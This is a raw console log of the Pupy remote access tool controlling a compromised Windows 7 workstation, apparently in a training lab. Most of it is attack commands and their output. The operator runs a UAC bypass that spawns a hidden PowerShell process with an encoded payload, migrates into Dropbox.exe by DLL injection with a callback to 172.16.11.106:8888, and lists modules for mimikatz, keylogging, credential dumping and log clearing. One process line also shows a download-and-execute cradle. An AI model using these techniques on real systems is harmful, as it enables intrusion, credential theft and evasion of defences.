  File "/usr/local/lib/python2.7/dist-packages/rpyc/core/netref.py", line 72, in syncreq
    return conn.sync_request(handler, oid, *args)
  File "/home/ol/pupy/pupy/network/lib/connection.py", line 387, in sync_request
    raise obj
Exception: [INJECT] inject_dll. VirtualAllocEx 2 failed

========= Remote Traceback (1) =========
Traceback (most recent call last):
Exception: [INJECT] inject_dll. VirtualAllocEx 2 failed

[-] [INJECT] inject_dll. VirtualAllocEx 2 failed

========= Remote Traceback (1) =========
Traceback (most recent call last):
Exception: [INJECT] inject_dll. VirtualAllocEx 2 failed
>> help
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ ALIASED MODULES }
MODULE   DESCRIPTION                                        
------------------------------------------------------------
alive    request to send keepalive packets on rpyc level    
cp       copy file or directory                             
exit     exit the client on the other side                  
rm       remove a file or a directory                       
netstat  list terminal sessions                             
last     list terminal sessions                             
w        list terminal sessions                             
cd       change directory                                   
date     Get current date                                   
ps       list processes                                     
mkdir    create an empty directory                          
forward  Local/remote port forwarding and SOCKS proxy       
ls       list system files                                  
pwd      Get current working dir                            
cat      show contents of a file                            
mv       move file or directory                             
ip       list interfaces                                    
getpid   list process information                           
http     Trivial Get/Post requests via HTTP protocol        
getppid  list parent process information                    
getuid   get username                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        

Use help -M command to show all available modules                         
  
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1396 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3384 C:\Windows\System32\conhost.exe 2614504301540442218206115356152445613-842565451-2082273366-42057440-1409489348
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 
>> help migrate
Module: migrate: Migrate Pupy Into Another Process Using Reflective Dll Injection

usage: migrate [-h] [--no-wait] [-c <exe_path>] [-p process_name] [-k]
               [-t TIMEOUT]
               [pid]

Migrate pupy into another process using reflective DLL injection 

positional arguments:
  pid                   pid

optional arguments:
  -h, --help            show this help message and exit
  --no-wait             Does not Hook exit thread function and wait until pupy
                        exists (Linux)
  -c <exe_path>, --create <exe_path>
                        create a new process and inject into it
  -p process_name, --process process_name
                        search a process name and migrate into
  -k, --keep            migrate into the process but create a new session and
                        keep the current pupy session running
  -t TIMEOUT, --timeout TIMEOUT
                        time in seconds to wait for the connection


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  

Alias: migrate: migrate
>> help -M
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ MODULES }
CATEGORY  NAME               HELP                                                                                                              
-----------------------------------------------------------------------------------------------------------------------------------------------
admin     clear_logs         Clear Event Logs                                                                                                  
admin     psh                Load/Execute Powershell Scripts                                                                                   
admin     ssh                Ssh Client                                                                                                        
admin     rfs                Mount Remote Fs As Fuse Fs To Mountpoint                                                                          
admin     reg                Search/List/Get/Set/Delete Registry Keys/Values                                                                   
admin     smbspider          Walk Through A Smb Directory And Recursively Search A String Into Files                                           
admin     shell_exec         Execute Shell Commands On A Remote System                                                                         
admin     logs               Show Logs (Or Try To Search Something)                                                                            
admin     alive              Request To Send Keepalive Packets On Rpyc Level                                                                   
admin     rdesktop           Start A Remote Desktop Session Using A Browser Websocket Client                                                   
admin     cp                 Copy File Or Directory                                                                                            
admin     interactive_shell  Open An Interactive Command Shell With A Nice Tty                                                                 
admin     shares             List Local And Remote Shared Folder And Permission                                                                
admin     rm                 Remove A File Or A Directory                                                                                      
admin     smb                Copy Files Via Smb Protocol                                                                                       
admin     hibernate          Close Session During X Hours                                                                                      
admin     netstat            List Terminal Sessions                                                                                            
admin     become             Become User                                                                                                       
admin     sshell             Interactive Ssh Shell                                                                                             
admin     last               List Terminal Sessions                                                                                            
admin     rdp                Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host                                   
admin     w                  List Terminal Sessions                                                                                            
admin     getdomain          Get Primary Domain Controller                                                                                     
admin     cd                 Change Directory                                                                                                  
admin     date               Get Current Date                                                                                                  
admin     pexec              Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen                             
admin     ps                 List Processes                                                                                                    
admin     zip                Zip / Unzip File Or Directory                                                                                     
admin     mkdir              Create An Empty Directory                                                                                         
admin     dns                Retrieve Domain Name From Ip And Vice Versa                                                                       
admin     ls                 List System Files                                                                                                 
admin     psexec             Launch Remote Commands Using Smbexec Or Wmiexec                                                                   
admin     pwd                Get Current Working Dir                                                                                           
admin     pyexec             Execute Python Code On A Remote System                                                                            
admin     beroot             Check For Privilege Escalation Path                                                                               
admin     cat                Show Contents Of A File                                                                                           
admin     pyshell            Open An Interactive Python Shell On The Remote Client                                                             
admin     mv                 Move File Or Directory                                                                                            
admin     display            Set Display Variable                                                                                              
admin     ip                 List Interfaces                                                                                                   
admin     getpid             List Process Information                                                                                          
admin     sudo_alias         Write An Alias For Sudo To Retrieve User Password                                                                 
admin     igd                Upnp Igd Client                                                                                                   
admin     stat               Show A Bit More Info About File Path. Acls/Caps/Owner For Now                                                     
admin     http               Trivial Get/Post Requests Via Http Protocol                                                                       
admin     x509               Fetch Certificate From Server                                                                                     
admin     getppid            List Parent Process Information                                                                                   
admin     drives             List Valid Drives In The System                                                                                   
admin     services           List Services                                                                                                     
admin     getuid             Get Username                                                                                                      
creds     loot_memory        Crawl Processes Memory And Look For Cleartext Credentials                                                         
creds     creddump           Download The Hives From A Remote Windows System And Dump Creds                                                    
creds     lazagne            Retrieve Passwords Stored On The Target                                                                           
creds     mimipy             Run Mimipy To Retrieve Credentials From Memory                                                                    
creds     memstrings         Dump Printable Strings From Process Memory For Futher Analysis                                                    
exploit   mimishell          Execute Mimikatz From Memory (Interactive)                                                                        
exploit   mimikatz           Execute Mimikatz From Memory (Non-Interactive)                                                                    
exploit   exploit_suggester  Exploit Suggester                                                                                                 
exploit   shellcode_exec     Executes The Supplied Shellcode On A Client                                                                       
exploit   impersonate        List/Impersonate Process Tokens                                                                                   
gather    keylogger          A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)                                      
gather    hashmon            Try To Find Clear Text Passwords In Memory                                                                        
gather    get_info           Get Some Informations About One Or Multiple Clients                                                               
gather    contacts           To Get Contacts                                                                                                   
gather    isearch            Use Windows Search Index To Search For Data                                                                       
gather    search             Walk Through A Directory And Recursively Search A String Into Files                                               
gather    check_vm           Check If Running On Virtual Machine                                                                               
gather    outlook            Interact With Outlook Session Of The Targeted User                                                                
gather    record_mic         Record Sound With The Microphone !                                                                                
gather    pywerview          Rewriting Of Some Powerview'S Functionalities In Python                                                           
gather    apps               To Interact Manage Applications                                                                                   
gather    call               To Get Call Details                                                                                               
gather    mouselogger        Log Mouse Clicks And Take Screenshots Of Areas Around It                                                          
gather    powerview          Execute Powerview Commands                                                                                        
gather    get_hwuuid         Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)                                                                  
gather    webcamsnap         Take A Webcam Snap :)                                                                                             
gather    usniper            Globally Capture String Or Register During Execution At Specified                                                 
gather    cloudinfo          Retrieve Ec2/Digitalocean Metadata                                                                                
gather    users              Get Interactive Users                                                                                             
gather    screenshot         Take A Screenshot :)                                                                                              
gather    ttyrec             Globally Capture Intput/Output To Tty. Compatible With Kernels                                                    
gather    gpstracker         To Interact With Gps                                                                                              
general   exit               Exit The Client On The Other Side                                                                                 
general   process_kill       Kill A Process                                                                                                    
manage    getprivs           Manage Current Process Privileges                                                                                 
manage    edit               Edit Remote File Locally (Download->Edit->Upload)                                                                 
manage    upload             Upload A File/Directory To A Remote System                                                                        
manage    hide_process       Edit Current Process Argv & Env Not To Look Suspicious                                                            
manage    download           Download A File/Directory From A Remote System                                                                    
manage    tasks              Get Info About Registered Background Tasks                                                                        
manage    memory_exec        Execute A Executable From Memory                                                                                  
manage    lock_screen        Lock The Session                                                                                                  
manage    duplicate          Duplicate The Current Pupy Payload By Executing It From Memory                                                    
manage    load_package       Load A Python Package Onto A Remote Client. Packages Files Must Be Placed In One Of The Pupy/Packages/<Os>/<Arch>/
manage    migrate            Migrate Pupy Into Another Process Using Reflective Dll Injection                                                  
manage    write              Write Short String To File                                                                                        
manage    env                List/Get/Set/Unset Client Environment Variables                                                                   
manage    persistence        Enable / Disable Persistence                                                                                      
network   port_scan          Run A Tcp Port Scan                                                                                               
network   forward            Local/Remote Port Forwarding And Socks Proxy                                                                      
network   tcpdump            Module To Reproduce Some Of The Classic Tcpdump Tool Functions                                                    
privesc   getsystem          Try To Get Nt Authority System Privileges                                                                         
privesc   bypassuac                                                                                                                            
privesc   inveigh            Execute Inveigh Commands                                                                                          
privesc   privesc_checker    Linux Privilege Escalation Scripts                                                                                
troll     text_to_speach     Use Android Text To Speach To Say Something :)                                                                    
troll     vibrate            Activate The Phone/Tablet Vibrator :)                                                                             
troll     msgbox             Pop Up A Custom Message Box                                                                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        
>> bypassuac -l
[%] Comparing build number (7601) against 'Fixed In' build numbers, false positives might happen.

 Id:    Type:           Payload:        Admin:          Description:
 ----   -----------     -----------     --------        -----------------------
[-] 1	UAC bypass	True		False		Bypass UAC using runas, this only works if UAC is set to never notify
[-] 2	UAC bypass	True		False		Bypass UAC using fodhelper and registry key manipulation
[-] 3	UAC bypass	True		False		Bypass UAC using slui and registry key manipulation
[-] 4	UAC bypass	True		False		Bypass UAC using silentcleanup and registry key manipulation
[-] 5	UAC bypass	True		False		Bypass UAC using sdclt (isolatedcommand) and registry key manipulation
[-] 6	UAC bypass	True		False		Bypass UAC using sdclt (app paths) and registry key manipulation
[+] 7	UAC bypass	True		False		Bypass UAC using perfmon and registry key manipulation
[+] 8	UAC bypass	True		False		Bypass UAC using eventviewer and registry key manipulation
[+] 9	UAC bypass	True		False		Bypass UAC using compmgmtlauncher and registry key manipulation
[-] 10	UAC bypass	True		False		Bypass UAC using computerdefaults and registry key manipulation
[+] 11	UAC bypass	True		False		Bypass UAC using cliconfg (DLL) and registry key manipulation
[+] 12	UAC bypass	True		False		Bypass UAC using mcx2prov (DLL) and registry key manipulation
[+] 13	UAC bypass	True		False		Bypass UAC using migwiz (DLL) and registry key manipulation
[+] 14	UAC bypass	True		False		Bypass UAC using sysprep (DLL) and registry key manipulation
>> bypassuac -m 9
[%] Using powershell payload
[%] Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target

{ Configuration }
KEY            VALUE                                                
--------------------------------------------------------------------
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
cid            112400816                                            

[+] Required credentials (found)
  + SSL_BIND_CERT
[+] Generating native payload with the current config from pupyx86.dll - size=3428864
[+] packing pupy into C# source ...
[+] compiling via mono command: mcs -target:library -debug- -optimize+ -unsafe -noconfig -sdk:2 -OUT:./pupy_zHTtWhDF.exe /home/ol/pupy/pupy/pupy_wxuWiQ.cs
warning CS8001: SDK path could not be resolved
Compilation succeeded - 1 warning(s)
[+] Wrapped .NET payload - size=3443200
[+] PowerLoader: Serving payload to pipe=3A4ADZ5JLV for 90 seconds
[%] Bypass uac could take few seconds, be patient...
[%] PowerLoader: Thread started (pipe=3A4ADZ5JLV, payload=3443200, md5=af4295fdad26a6fd4fcf511eb8184b44)
[%] PowerLoader: Open - OK
[%] PowerLoader: Push - OK
[+] PowerLoader: FLUSH - OK
[%] Attempting to run id (9) configured with payload (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -EncodedCommand JABwAHMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGkAcABlAHMALgBQAGkAcABlAFMAZQBjAHUAcgBpAHQAeQA7AAoAJABhAGwAbAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AUwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIAKAAiAFMALQAxAC0AMQAtADAAIgApADsACgAkAGEAYwBsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4AUABpAHAAZQBBAGMAYwBlAHMAcwBSAHUAbABlACgAJABhAGwAbAAsACIARgB1AGwAbABDAG8AbgB0AHIAbwBsACIALAAiAEEAbABsAG8AdwAiACkAOwAKACQAcABzAC4AQQBkAGQAQQBjAGMAZQBzAHMAUgB1AGwAZQAoACQAYQBjAGwAKQA7AAoAJABwAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4ATgBhAG0AZQBkAFAAaQBwAGUAUwBlAHIAdgBlAHIAUwB0AHIAZQBhAG0AKAAiADMAQQA0AEEARABaADUASgBMAFYAIgAsACIASQBuACIALAAyACwAIgBCAHkAdABlACIALAAwACwAMwA0ADQAMwAyADAAMAAsADAALAAkAHAAcwApADsACgAkAHAALgBXAGEAaQB0AEYAbwByAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAkAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBCAGkAbgBhAHIAeQBSAGUAYQBkAGUAcgAoACQAcAApADsACgAkAGEAPQAkAHgALgBSAGUAYQBkAEIAeQB0AGUAcwAoADMANAA0ADMAMgAwADAAKQA7AAoAJAB4AC4AQwBsAG8AcwBlACgAKQA7AAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAKQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAWwAwAF0ALgBHAGUAdABNAGUAdABoAG8AZABzACgAKQBbADAAXQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACkAKQA7AA==)
[+] Successfully created Default key containing payload (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -EncodedCommand JABwAHMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGkAcABlAHMALgBQAGkAcABlAFMAZQBjAHUAcgBpAHQAeQA7AAoAJABhAGwAbAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AUwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIAKAAiAFMALQAxAC0AMQAtADAAIgApADsACgAkAGEAYwBsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4AUABpAHAAZQBBAGMAYwBlAHMAcwBSAHUAbABlACgAJABhAGwAbAAsACIARgB1AGwAbABDAG8AbgB0AHIAbwBsACIALAAiAEEAbABsAG8AdwAiACkAOwAKACQAcABzAC4AQQBkAGQAQQBjAGMAZQBzAHMAUgB1AGwAZQAoACQAYQBjAGwAKQA7AAoAJABwAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4ATgBhAG0AZQBkAFAAaQBwAGUAUwBlAHIAdgBlAHIAUwB0AHIAZQBhAG0AKAAiADMAQQA0AEEARABaADUASgBMAFYAIgAsACIASQBuACIALAAyACwAIgBCAHkAdABlACIALAAwACwAMwA0ADQAMwAyADAAMAAsADAALAAkAHAAcwApADsACgAkAHAALgBXAGEAaQB0AEYAbwByAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAkAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBCAGkAbgBhAHIAeQBSAGUAYQBkAGUAcgAoACQAcAApADsACgAkAGEAPQAkAHgALgBSAGUAYQBkAEIAeQB0AGUAcwAoADMANAA0ADMAMgAwADAAKQA7AAoAJAB4AC4AQwBsAG8AcwBlACgAKQA7AAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAKQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAWwAwAF0ALgBHAGUAdABNAGUAdABoAG8AZABzACgAKQBbADAAXQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACkAKQA7AA==)
[%] Disabling file system redirection
[+] Successfully disabled file system redirection
[+] Successfully spawned process (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -EncodedCommand JABwAHMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGkAcABlAHMALgBQAGkAcABlAFMAZQBjAHUAcgBpAHQAeQA7AAoAJABhAGwAbAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AUwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIAKAAiAFMALQAxAC0AMQAtADAAIgApADsACgAkAGEAYwBsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4AUABpAHAAZQBBAGMAYwBlAHMAcwBSAHUAbABlACgAJABhAGwAbAAsACIARgB1AGwAbABDAG8AbgB0AHIAbwBsACIALAAiAEEAbABsAG8AdwAiACkAOwAKACQAcABzAC4AQQBkAGQAQQBjAGMAZQBzAHMAUgB1AGwAZQAoACQAYQBjAGwAKQA7AAoAJABwAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4ATgBhAG0AZQBkAFAAaQBwAGUAUwBlAHIAdgBlAHIAUwB0AHIAZQBhAG0AKAAiADMAQQA0AEEARABaADUASgBMAFYAIgAsACIASQBuACIALAAyACwAIgBCAHkAdABlACIALAAwACwAMwA0ADQAMwAyADAAMAAsADAALAAkAHAAcwApADsACgAkAHAALgBXAGEAaQB0AEYAbwByAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAkAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBCAGkAbgBhAHIAeQBSAGUAYQBkAGUAcgAoACQAcAApADsACgAkAGEAPQAkAHgALgBSAGUAYQBkAEIAeQB0AGUAcwAoADMANAA0ADMAMgAwADAAKQA7AAoAJAB4AC4AQwBsAG8AcwBlACgAKQA7AAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAKQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAWwAwAF0ALgBHAGUAdABNAGUAdABoAG8AZABzACgAKQBbADAAXQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACkAKQA7AA==)
[+] Successfully cleaned up, enjoy!
>> info
hostname       RSRCH-WIN7-WS1                                             
user           RESEARCH\kroberts                                          
release        7                                                          
version        6.1.7601                                                   
os_arch        AMD64                                                      
proc_arch      32bit                                                      
pid            1396                                                       
exec_path      C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
cid            0000000006b319b0                                           
address        172.16.0.7                                                 
macaddr        1e:97:2d:f3:32:85                                          
revision       ?                                                          
node           1e972df33285                                               
native         True                                                       
proxy          ?                                                          
external_ip    ?                                                          
uac_lvl        2/3                                                        
intgty_lvl     Medium                                                     
local_adm      Yes                                                        
transport      tcp_cleartext                                              
launcher       connect                                                    
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext        
platform       windows/x86                                                
>> sessions
id  user               hostname        platform  release  os_arch  proc_arch  intgty_lvl  address     tags  
------------------------------------------------------------------------------------------------------------
1   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1396 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3384 C:\Windows\System32\conhost.exe 2614504301540442218206115356152445613-842565451-2082273366-42057440-1409489348
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 
>> migrate 2668
[+] Migrating to existing windows process identified with the pid 2668
[+] looking for configured connect back address ...
[+] address configured is 172.16.11.106:8888 ...
[+] looking for process 2668 architecture ...
[+] process is 32 bits

{ Configuration }
KEY            VALUE                                                
--------------------------------------------------------------------
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
cid            112400816                                            

[+] Required credentials (found)
  + SSL_BIND_CERT
[+] Template: pupyx86.dll
[+] injecting DLL in target process 2668 ...
[+] DLL injected !
[+] waiting for a connection from the DLL ...
[+] got a connection from migrated DLL !
[*] Session 2 opened (RESEARCH\kroberts) (172.16.11.106:8888 <- 172.16.0.7:52193)
>> [+] migration completed
[*] Session 1 closed
>> help
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ ALIASED MODULES }
MODULE   DESCRIPTION                                        
------------------------------------------------------------
alive    request to send keepalive packets on rpyc level    
cp       copy file or directory                             
exit     exit the client on the other side                  
rm       remove a file or a directory                       
netstat  list terminal sessions                             
last     list terminal sessions                             
w        list terminal sessions                             
cd       change directory                                   
date     Get current date                                   
ps       list processes                                     
mkdir    create an empty directory                          
forward  Local/remote port forwarding and SOCKS proxy       
ls       list system files                                  
pwd      Get current working dir                            
cat      show contents of a file                            
mv       move file or directory                             
ip       list interfaces                                    
getpid   list process information                           
http     Trivial Get/Post requests via HTTP protocol        
getppid  list parent process information                    
getuid   get username                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        

Use help -M command to show all available modules
>> info
hostname       RSRCH-WIN7-WS1                                       
user           RESEARCH\kroberts                                    
release        7                                                    
version        6.1.7601                                             
os_arch        AMD64                                                
proc_arch      32bit                                                
pid            2668                                                 
exec_path      C:\Program Files (x86)\Dropbox\Client\Dropbox.exe    
cid            0000000006b319b0                                     
address        172.16.0.7                                           
macaddr        1e:97:2d:f3:32:85                                    
revision       ?                                                    
node           1e972df33285                                         
native         True                                                 
proxy          ?                                                    
external_ip    ?                                                    
uac_lvl        2/3                                                  
intgty_lvl     Medium                                               
local_adm      Yes                                                  
transport      tcp_cleartext                                        
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
platform       windows/x86                                          
>> help -M
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ MODULES }
CATEGORY  NAME               HELP                                                                                                              
